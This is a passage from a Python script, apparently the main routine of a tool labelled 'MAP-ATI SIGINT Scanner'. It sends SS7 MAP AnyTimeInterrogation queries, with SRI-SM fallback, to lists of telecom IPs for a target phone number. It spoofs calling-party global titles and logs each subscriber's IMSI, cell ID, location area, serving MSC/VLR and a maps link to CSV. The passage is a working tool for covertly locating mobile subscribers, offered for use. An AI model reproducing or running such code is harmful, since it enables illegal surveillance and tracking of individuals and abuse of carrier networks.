    logger.handlers.clear();LFRMT='%(message)s';LFMTF='%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)s]-%(module)s:%(funcName)s:%(lineno)d-%(message)s'
    rh=RichHandler(console=console,rich_tracebacks=True,markup=True,show_path=False,log_time_format="[%X.%Lms]");rh.setFormatter(logging.Formatter(LFRMT));rh.setLevel(args.log_level.upper());logger.addHandler(rh)
    fh=logging.FileHandler(log_f,mode='a',encoding='utf-8');fh.setFormatter(logging.Formatter(LFMTF,datefmt='%Y-%m-%d %H:%M:%S'));fh.setLevel(logging.DEBUG);logger.addHandler(fh);logger.setLevel(logging.DEBUG)
    
    logger.info(f"Console log level: {args.log_level.upper()}. Debug log: {log_f}")
    if logger_init_construct_info: logger.info(logger_init_construct_info)
    if logger_init_pycrate_info: logger.info(logger_init_pycrate_info) 
    
    if not PYCRATE_AVAILABLE: 
        logger.critical("Essential Pycrate components or ASN.1 definitions (TCAP/MAP) are missing. PDU construction disabled. Exiting.")
        sys.exit(1)
    else:
        logger.info("Pycrate and ASN.1 definitions appear to be successfully loaded.")

    if not args.cgpa_ssn_pool: args.cgpa_ssn_pool = DEFAULT_CGPA_SSN_POOL
    if not args.sccp_proto_class_pool: args.sccp_proto_class_pool = DEFAULT_SCCP_PROTO_CLASS_POOL
    args.cgpa_gt_list_from_file = []
    if args.cgpa_gt_file:
        try:
            gfp=Path(args.cgpa_gt_file)
            if gfp.is_file():
                with open(gfp,'r',encoding='utf-8') as f:args.cgpa_gt_list_from_file=[l.strip() for l in f if l.strip() and not l.startswith('#')]
                if args.cgpa_gt_list_from_file: logger.info(f"Loaded {len(args.cgpa_gt_list_from_file)} CgPA GTs from '{args.cgpa_gt_file}'")
            else: logger.warning(f"CgPA GT file '{args.cgpa_gt_file}' not found.")
        except Exception as e: logger.error(f"Error reading CgPA GT file '{args.cgpa_gt_file}': {e}.")
    
    if not fixed_csv_header_keys: 
        fixed_csv_header_keys.extend(["ip","port","timestamp","sent_otid","used_cgpa_gt","used_cgpa_ssn","used_sccp_pc","ati_variant_used","is_fallback","attempt_number","dtid_match_status","sccp_data_ptr_valid","mcc","mnc","lac","cell_id","cgi_hex_full","cgi_dec","maps_link","imsi","vlr_name","msc_name","subscriber_state_interpreted","subscriber_state_raw","sri_sm_msc_address","timeout_phase","error_info","raw_response_hex","duration_ms","tcap_outcome"])
    
    if not args.no_csv:
        m_csv_p=rp/"master_scan_summary.csv"
        if not m_csv_p.exists() or os.path.getsize(m_csv_p)==0:
            try:
                with open(m_csv_p,'w',newline='',encoding='utf-8') as f_m:f_m.write(",".join(fixed_csv_header_keys)+"\n")
                logger.info(f"Created master CSV: {m_csv_p}")
            except IOError as e: logger.error(f"Could not write master CSV {m_csv_p}: {e}");args.no_csv=True
    
    if args.debug_hex_file:
        logger.info(f"Debug hex file mode: {args.debug_hex_file}. This part of logic needs to be implemented if used.")
        sys.exit(0)

    console.print(Panel(Text("MAP-ATI SIGINT Scanner - Pycrate Only Mode",style="bold purple justify"),padding=(1,2),border_style="purple",expand=False))
    target_ports=parse_ports_cli(args.sctp_ports);logger.info(f"Target MSISDN: {args.target_msisdn}, Threads: {args.threads}, Ports: {target_ports}")
    if not Path(args.ips_file).is_file(): logger.critical(f"IPs file '{args.ips_file}' not found.");sys.exit(1)
    ips=[];
    try:
        with open(args.ips_file,'r',encoding='utf-8') as f_i:ips=[l.strip().split('#')[0].strip() for l in f_i if l.strip().split('#')[0].strip()]
    except Exception as e: logger.critical(f"Error reading IP file '{args.ips_file}': {e}");sys.exit(1)
    if not ips: logger.critical(f"No valid IPs in '{args.ips_file}'.Exiting.");sys.exit(0)
    logger.info(f"Loaded {len(ips)} IPs for scanning across {len(target_ports)} port(s) each.")

    tasks_to_submit = [{"ip":ip_a,"port":p_v,"otid":os.urandom(4),"variant":args.ati_variant,"is_fallback":False, "attempt_number":1} for ip_a in ips for p_v in target_ports]
    all_results=[] ; total_initial_tasks=len(tasks_to_submit)
    if total_initial_tasks==0: logger.warning("No tasks to submit. Exiting.");sys.exit(0)
    logger.info(f"Starting scan pool with {args.threads} workers for {total_initial_tasks} initial tasks.")

    with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),TimeRemainingColumn(),console=console,transient=False) as prog:
        scan_task=prog.add_task("[purple]Scanning...",total=total_initial_tasks);active_f:TypingDict[Any,TypingDict]={}
        with ThreadPoolExecutor(max_workers=args.threads,thread_name_prefix="PegasusWorker") as exctr:
            for task_def in tasks_to_submit:active_f[exctr.submit(process_ip,task_def["ip"],task_def["port"],args,task_def["otid"],task_def["variant"],task_def["is_fallback"],task_def["attempt_number"])]=task_def
            processed_count=0;current_total_prog=total_initial_tasks
            while active_f:
                try:done_f,_=wait(list(active_f.keys()),return_when=FIRST_COMPLETED,timeout=1.0)
                except Exception as e:logger.exception(f"Exception in futures.wait: {e}");break
                if not done_f and not active_f:break
                if not done_f and active_f:prog.update(scan_task,description=f"[purple]Scan Active:{len(active_f)}");continue
                for fut in done_f:
                    processed_count+=1;prog.update(scan_task,completed=processed_count,total=current_total_prog,description=f"[purple]Scan:{processed_count}/{current_total_prog}")
                    orig_task=active_f.pop(fut);ip_d,port_d,otid_o=orig_task["ip"],orig_task["port"],orig_task["otid"]
                    try:
                        res_obj=fut.result()
                        if res_obj:all_results.append(res_obj)
                        next_variant_to_try = None
                        if args.auto_ati_variant_sequence and not orig_task["is_fallback"] and res_obj and \
                                ('cgi_found' not in res_obj or not res_obj['cgi_found']):
                            if orig_task["variant"] == AtiVariant.STANDARD: next_variant_to_try = AtiVariant.LOCATION_ONLY
                        
                        if next_variant_to_try:
                            logger.info(f"[yellow]Auto ATI Seq for {ip_d}:{port_d}: Trying {next_variant_to_try.name}.[/yellow]")
                            new_task_def={"ip":ip_d,"port":port_d,"otid":os.urandom(4),"variant":next_variant_to_try,"is_fallback":False,"attempt_number":orig_task["attempt_number"]+1}
                            new_f=exctr.submit(process_ip,new_task_def["ip"],new_task_def["port"],args,new_task_def["otid"],new_task_def["variant"],new_task_def["is_fallback"],new_task_def["attempt_number"])
                            active_f[new_f]=new_task_def;current_total_prog+=1;prog.update(scan_task,total=current_total_prog)
                        
                        if args.enable_sri_fallback and not orig_task["is_fallback"] and res_obj and \
                                ('imsi' in res_obj and res_obj["imsi"] != "N/A") and \
                                ('cgi_found' not in res_obj or not res_obj['cgi_found']) and \
                                ('sri_sm_msc_address' not in res_obj or not res_obj['sri_sm_msc_address']): 
                            logger.info(f"[blue]SRI Fallback triggered for {ip_d}:{port_d} (IMSI: {res_obj['imsi']})[/blue]")
                            sri_task_def = {"ip":ip_d,"port":port_d,"otid":os.urandom(4),"variant":orig_task["variant"],"is_fallback":True,"attempt_number":1}
                            new_f=exctr.submit(process_ip,sri_task_def["ip"],sri_task_def["port"],args,sri_task_def["otid"],sri_task_def["variant"],sri_task_def["is_fallback"],sri_task_def["attempt_number"])
                            active_f[new_f]=sri_task_def;current_total_prog+=1;prog.update(scan_task,total=current_total_prog)

                    except Exception as exc:logger.error(f"Task IP {ip_d}:{port_d}(OTID:{binascii.hexlify(otid_o).decode()}) exception in main loop:{exc}",exc_info=True)
    logger.info("Scan finished.");console.print(Panel(Text("Scan Complete",style="bold green justify"),border_style="green",expand=False))
    s_cgi_std = sum(1 for r in all_results if r.get("cgi_found") and not r.get("is_fallback") and r.get("ati_variant_used") == AtiVariant.STANDARD.value and r.get("attempt_number") == 1)
    s_imsi_std = sum(1 for r in all_results if r.get("imsi") != "N/A" and not r.get("cgi_found") and not r.get("is_fallback") and r.get("ati_variant_used") == AtiVariant.STANDARD.value and r.get("attempt_number") == 1)
    s_cgi_loc = sum(1 for r in all_results if r.get("cgi_found") and not r.get("is_fallback") and r.get("ati_variant_used") == AtiVariant.LOCATION_ONLY.value)
    sri_ok = sum(1 for r in all_results if r.get("sri_sm_msc_address")!="N/A" and r.get("is_fallback"))
    console.print(f"Total initial tasks: {total_initial_tasks}"); console.print(f"Total operations executed: {processed_count}/{current_total_prog}")
    console.print(f"Successful ATI CGI (Standard, 1st): [bold green]{s_cgi_std}[/]"); console.print(f"Successful ATI IMSI only (Standard, 1st, no CGI): [bold cyan]{s_imsi_std}[/]")
    if args.auto_ati_variant_sequence: console.print(f"Successful ATI CGI (LocationOnly attempts): [bold green]{s_cgi_loc}[/]")
    if args.enable_sri_fallback: console.print(f"Successful SRI-SM Fallbacks (MSC found): [bold blue]{sri_ok}[/]")
    logger.info(f"Results in: {args.results_dir}"); console.print(f"Results in: [bold green]{Path(args.results_dir).resolve()}[/]")

if __name__ == "__main__":
    if sys.version_info < (3,7): print("This script requires Python 3.7+."); sys.exit(1)
    main()
